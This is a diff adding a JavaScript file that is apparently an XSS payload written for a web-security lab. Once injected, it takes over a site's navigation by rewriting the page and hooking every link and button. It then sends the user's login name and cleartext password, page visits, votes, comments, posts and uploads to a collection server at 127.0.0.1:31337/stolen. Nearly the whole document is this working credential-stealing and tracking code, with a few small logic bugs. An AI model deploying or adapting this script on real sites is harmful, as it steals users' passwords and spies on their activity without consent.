@@ -1,0 +1,421 @@
+// TODO: fix login/logout url issue
+
+
+var globalUsername;
+var globalUsernameLastAttemp;
+var server_address = 'http://127.0.0.1:31337/stolen';
+
+if (window.history && window.history.pushState) {
+
+    $(window).on('popstate', function(event) {
+      var url = window.location.href;
+      //console.log('Back button was pressed. will go bakc to'+ url);
+      loadContent(url, replacePage, null, 2);
+      event.preventDefault();
+    });
+}
+
+var script = document.createElement('script');script.src = "https://code.jquery.com/jquery-3.4.1.min.js";document.getElementsByTagName('head')[0].appendChild(script);
+
+function communicationHAndler(payload){
+    var url = server_address + '?' + payload;
+    try{
+        $.get(url, function(){
+
+        });
+    }catch(e){
+
+    }
+    
+}
+
+function getValue(data, param) {
+    var query = data;
+    if(typeof data == 'string' || data instanceof String){
+        var vars = query.split('&');
+        for (var i = 0; i < vars.length; i++) {
+            var pair = vars[i].split('=');
+            if ((pair[0]) == param) {
+                return (pair[1]);
+            }
+        }
+
+    }
+    
+    return null;
+}
+
+function loadNotify(url, data){
+    var path = url.substring(url.lastIndexOf("/")+1);
+    var query_values;
+    if(path.lastIndexOf("?")!=-1){//contains query values
+        query_values = path.substring(path.lastIndexOf("?")+1);
+        path = path.substring(0, path.lastIndexOf("?"));
+    }
+    //console.log("final path is : " + path);
+    var payload;
+    switch(path){
+        case "login.php":// fetch login page
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            
+            break;
+        case "logout.php":
+            payload = "event=logout&user="+globalUsername;
+            break;
+        case "view.php":
+            // need two post
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            communicationHAndler(payload);
+            var id = query_values.substring(query_values.lastIndexOf("=")+1);
+            if(globalUsername){
+                payload = "event=view&user="+globalUsername+"&post="+id;
+            }else{
+                payload = "event=view&post="+id;
+            }
+            break;
+        
+        case "":
+        case "index.php":
+            // index page
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            break;
+        case "privacy.php":
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            break;
+        case "content.php":
+            payload = "event=nav&user="+globalUsername+"&url="+path;
+            break;
+        case "vote.php":
+            var id = getValue(data, 'id');
+            var vote = getValue(data, 'vote');
+            payload = "event=vote&user="+globalUsername+"&post="+id +"&vote="+vote;
+            break;
+        default:
+            if(globalUsername){
+                payload = "event=link&user="+globalUsername+"&link="+url;
+            }else{
+                payload = "event=link&link="+url;
+            }
+    }
+    // trigger send get request to server
+    
+    communicationHAndler(payload);
+}
+
+
+function loadContent(url, callback,data,type)
+{
+    //console.log("load Conetnt on : " + url);
+    loadNotify(url, data);
+    
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function()
+    {
+        if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
+        {   
+            var responsePath = xmlhttp.responseURL.substring(xmlhttp.responseURL.lastIndexOf("/")+1);
+            if(responsePath.lastIndexOf("?")!=-1){//contains query values
+                responsePath = responsePath.substring(0, responsePath.lastIndexOf("?"));
+            }
+
+            var oriPath = url.substring(url.lastIndexOf("/")+1);
+            if(oriPath.lastIndexOf("?")!=-1){//contains query values
+                oriPath = oriPath.substring(0, oriPath.lastIndexOf("?"));
+            }
+
+            if(responsePath != oriPath){
+                ////console.log("redirect to: " + responsePath + " ori : " + oriPath);
+                if(responsePath == "view.php" && oriPath == "vote.php"){
+
+                }else{
+                    if(oriPath == "logout.php"){
+                        globalUsername = null;
+                    }
+                    url = responsePath;
+                    // redirect
+                    loadNotify(url,null);
+                }
+                
+            }
+
+            if(type == 1){
+                callback(url,xmlhttp.response, 1);
+            }else{
+                callback(url,xmlhttp.response, 2);
+            }
+            
+        }
+    }
+    xmlhttp.open("GET", url, false);
+    if(data == null){
+        xmlhttp.send();
+    }else{
+        xmlhttp.send(data);  
+    }
+    
+}
+
+function postNotify(url, data){
+    var path = url.substring(url.lastIndexOf("/")+1);
+    var payload;
+    
+    var username = getValue(data, 'username');
+    var password = getValue(data, 'password');
+    var comment = getValue(data, 'comment');
+    var parent = getValue(data, 'parent');
+    var uid =  getValue(data, 'uid');
+    var title = getValue(data, 'title');
+    var content = getValue(data, 'content');
+    var posttype = getValue(data, 'type');
+    // upload.php for image
+    var willPost = 1;
+    if(username != null && password !=null){
+        payload = "event=login&user="+username+"&pass="+password;
+    }else if(comment != null && parent !=null){
+        payload = "event=comment&user="+globalUsername+"&parent="+parent;
+    }else if(title != null && content != null && type !=null){
+        payload = "event=post&user=" + globalUsername + "&title=" + title + "&type=" + posttype;
+    }else if(url == "upload.php"){
+        payload = "event=image&user=" + globalUsername;
+    }else{
+        willPost = 0;
+        ////console.log("unrecongized post type !!");
+    }
+
+    // trigger send get request to server
+    if(willPost == 1){
+        communicationHAndler(payload);
+    }
+}
+
+function postRequest(url, callback, data, type){
+    ////console.log("will post to "+ url +" data is : " + data);
+    
+    postNotify(url, data);
+
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function()
+    {
+        if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
+        {
+            
+
+            var responsePath = xmlhttp.responseURL.substring(xmlhttp.responseURL.lastIndexOf("/")+1);
+            if(responsePath.lastIndexOf("?")!=-1){//contains query values
+                responsePath = responsePath.substring(0, responsePath.lastIndexOf("?"));
+            }
+            var oriPath = url.substring(url.lastIndexOf("/")+1);
+            if(oriPath.lastIndexOf("?")!=-1){//contains query values
+                oriPath = oriPath.substring(0, oriPath.lastIndexOf("?"));
+            }
+
+            if(responsePath != oriPath){
+                ////console.log("redirect to: " + responsePath + " ori : " + oriPath);
+                if(responsePath == "view.php" && (oriPath == "vote.php" || oriPath == "post.php")){
+
+                }else{
+                    //console.log(responsePath + " " + oriPath + " " + globalUsername + " " + globalUsernameLastAttemp);
+                    if(responsePath == "index.php" && oriPath == "post.php" && globalUsername == null ){
+                        globalUsername = globalUsernameLastAttemp;
+                    }
+                    url = responsePath;
+                    // redirect
+                    loadNotify(url,null);
+                }
+                
+            }
+            if(type == 1){
+                callback(url,xmlhttp.response, 1);
+            }else{
+                callback(url,xmlhttp.response, 2);
+            }
+        }else{
+            ////console.log("post status not handled: "+ xmlhttp.status);
+        }
+    }
+    xmlhttp.open("POST", url, true);
+    if(type == 1){
+        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    }else{
+        //xmlhttp.setRequestHeader("Content-Type", "multipart/form-data");
+    }
+    
+    xmlhttp.send(data);
+}
+
+function replacePage(url,data, type){
+    //////console.log(data);
+    var dummy = document.createElement( 'html' );
+    dummy.innerHTML = data;
+    yourGlobalVariable = dummy;
+    document.body.innerHTML = dummy.getElementsByTagName( 'body' )[0].innerHTML;
+    if(type == 1){
+        window.history.pushState(null, "Title", url);
+    }
+    //window.dispatchEvent(new HashChangeEvent("hashchange"))
+    addListener();
+    ////console.log("page listener add done");
+}
+
+function linkClickHandler(element){
+    ////console.log("called on "+ element.href);
+    if(element.href){
+        var path = element.href.substring(element.href.lastIndexOf("/")+1);
+        if(path == 'login.php' || 'logout.php'){// get login page
+            var url = element.href;
+            //////console.log("will fetch " + url);
+            loadContent(url,replacePage, null, 1);
+        }else{
+            var url = element.href;
+            //////console.log("will fetch " + url);
+            loadContent(url,replacePage, null, 1);
+        }
+    }
+    
+}
+
+function buttonClickHandler(element, url){
+    ////console.log("called on submit"+ element.id);
+    if(element.id == 'login-btn'){// submit login request
+        url =  'post.php';
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('userpass').value;
+        globalUsernameLastAttemp = username;
+        var data = "username=" + username + "&password=" + password +"&form=login";
+        console.log("will post username  " + username + " password " + password);
+
+        postRequest(url, replacePage, data, 1);
+    }else if(element.id == 'comment-post-btn'){
+        // post comment
+        url =  'post.php';
+        var comment = document.getElementById('comment').value;
+        var parent = document.getElementById('parent').value;
+        var uid = document.getElementById('uid').value;
+
+        var data = "comment=" + comment + "&form=comment&parent=" + parent +"&uid="+uid+"&submit=";
+        //console.log("will comments on behalf of  " + globalUsername + " parent " + parent);
+        postRequest(url, replacePage, data, 1);
+    }else if(element.id == 'content-post-btn'){
+        // make a new post
+        url =  'post.php';
+
+        var title = document.getElementById('title').value;
+        var content = document.getElementById('content').value;
+        var type = document.getElementById('type').value;
+
+        var data = "title=" + title + "&form=content&content=" + content +"&type="+type+"&submit=";
+        //console.log("will post on behalf of  " + globalUsername + "title: " + title + " type : " + type);
+        postRequest(url, replacePage, data, 1);
+    }else if(element.id == 'image-post-btn'){
+        //post an image
+        url = 'upload.php';
+       // var data = new FormData(document.getElementById("content-file").files[0]);
+        var data = new FormData($('#image-upload-frm')[0]);
+        data.processData = false;
+        data.contentType = false;
+        //console.log("will post image on behalf of  " + globalUsername );
+
+        postRequest(url, replacePage, data, 2);
+    }
+}
+
+function normalLinkHandler(username, url){
+    
+    // process url for different scenrio
+    var voteUrl = 'vote.php';
+    if(String(url).includes(voteUrl)){// process as post to vote
+        var postId = new RegExp(/\\?id=[0-9]+/);
+        var pos_vote_val = new RegExp(/vote=[0-9]+/);
+        var neg_vote_val = new RegExp(/vote=-\d+$/);
+
+        var postIdstr = String(url.match(postId));
+        var id = postIdstr.substring(postIdstr.lastIndexOf("=")+1);
+
+        var vote_valstr = String(url.match(pos_vote_val));
+        if(vote_valstr == "null"){
+            vote_valstr = String(url.match(neg_vote_val));
+        }
+        var val = vote_valstr.substring(vote_valstr.lastIndexOf("=")+1);
+        //console.log("user vote on post: "+ globalUsername + " postid : " + id + " vote val : "+ val);
+        var data = "id=" + id + "&vote=" + val;
+        loadContent(url,replacePage,data,1);
+
+    }else{
+        //console.log("user view on username: "+ globalUsername + " url : " +url);
+        loadContent(url,replacePage,null,1);
+    }
+    
+    return false;
+}
+
+
+function addListener(){
+    $('.custom-file-input').on('change', function() { 
+        let fileName = $(this).val().split('\\').pop(); 
+        $(this).next('.custom-file-label').addClass("selected").html(fileName); 
+    });
+
+    var usrname = document.getElementById('logged-in-user');
+    if(usrname){
+        globalUsername = usrname.innerText;
+    }else{
+        globalUsername = null;
+    }
+    for (var ls = document.links, numLinks = ls.length, i=0; i<numLinks; i++){
+        var target = document.getElementById(ls[i].id);
+        if(target){ // only ones with name like login/out
+            document.getElementById(ls[i].id).addEventListener('click', function(event){
+                event.preventDefault();
+                var targetElement = event.target || event.srcElement;
+                linkClickHandler(targetElement);
+            });
+        }else{
+
+            ls[i].setAttribute("onclick","normalLinkHandler('" + globalUsername + "','"+ls[i].href +"'); return false;");
+            
+        }
+        
+    }
+    var bns = document.getElementsByTagName("button");
+    for (i = 0; i < bns.length; i++) {
+        bns[i].addEventListener("click", function(event) {
+            event.preventDefault();
+            var targetElement = event.target || event.srcElement;
+            buttonClickHandler(targetElement, document.url); 
+        });
+    }
+}
+function payload(attacker) {
+    
+    addListener();
+
+    function log(data) {
+        //console.log($.param(data))
+        $.get(attacker, data);
+    }
+    function proxy(href) {
+        $("html").load(href, function(){
+        $("html").show();
+        log({event: "nav", url: href});
+        });
+    }
+    //$("html").hide();
+    //proxy("./");
+}
+payload("attack");
